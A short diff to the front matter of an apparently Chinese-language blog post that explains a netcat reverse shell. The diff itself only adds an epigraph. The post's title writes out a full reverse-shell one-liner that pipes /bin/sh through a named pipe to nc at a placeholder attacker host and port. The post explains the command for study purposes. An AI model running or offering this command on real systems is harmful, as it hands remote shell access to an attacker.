@@ -2,6 +2,7 @@
 title: 怎么理解mkfifo /tmp/p; /bin/sh 0</tmp/p | nc $attacker $port 1>/tmp/p
 layout: post
 ---
+> One man's wilderness is another man's theme park.——Author unknown  
 
 为了方便记忆，个人是这么理解的
 
